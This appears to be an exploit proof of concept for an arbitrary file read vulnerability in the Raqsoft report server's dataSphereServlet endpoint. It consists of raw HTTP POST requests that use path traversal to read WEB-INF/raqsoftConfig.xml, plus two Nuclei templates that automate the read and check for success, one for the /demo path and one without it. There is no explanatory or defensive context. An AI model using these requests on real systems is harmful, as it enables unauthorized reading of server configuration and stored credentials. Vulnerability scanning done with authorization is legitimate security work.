```

POST /demo/servlet/dataSphereServlet?action=11 HTTP/1.1
Host: 192.168.31.133:6868
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.31.133:6868/demo/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

path=../../../WEB-INF/raqsoftConfig.xml&content=&mode=
```

Nuclei：

```

id: runqianbaobiaowenjianduqu-DEMO

info:
  name: 润乾报表dataSphereServlet接口 任意文件读取漏洞-DEMO
  author: 紫色皓月
  severity: high
  description: 润乾报表dataSphereServlet接口 任意文件读取漏洞-DEMO
  tags: 2024,润乾报表,任意文件读取,DEMO

requests:
  - raw:
    - |
      POST /demo/servlet/dataSphereServlet?action=11 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Referer: http://{{Hostname}}/demo/
      Connection: close
      Upgrade-Insecure-Requests: 1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 54

      path=../../../WEB-INF/raqsoftConfig.xml&content=&mode=

    req-condition: true
    matchers:
      - type: word
        words:
          - '<?xml version="1.0" encoding="UTF-8"?>'
```





无demo

```
POST /servlet/dataSphereServlet?action=11 HTTP/1.1
Host: 192.168.31.133:6868
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.31.133:6868/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

path=../../../WEB-INF/raqsoftConfig.xml&content=&mode=
```

```
id: runqianbaobiaowenjianduqu

info:
  name: 润乾报表dataSphereServlet接口 任意文件读取漏洞
  author: 紫色皓月
  severity: high
  description: 润乾报表dataSphereServlet接口 任意文件读取漏洞
  tags: 2024,润乾报表,任意文件读取

requests:
  - raw:
    - |
      POST /servlet/dataSphereServlet?action=11 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Referer: http://{{Hostname}}/
      Connection: close
      Upgrade-Insecure-Requests: 1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 54

      path=../../../WEB-INF/raqsoftConfig.xml&content=&mode=

    req-condition: true
    matchers:
      - type: word
        words:
          - '<?xml version="1.0" encoding="UTF-8"?>'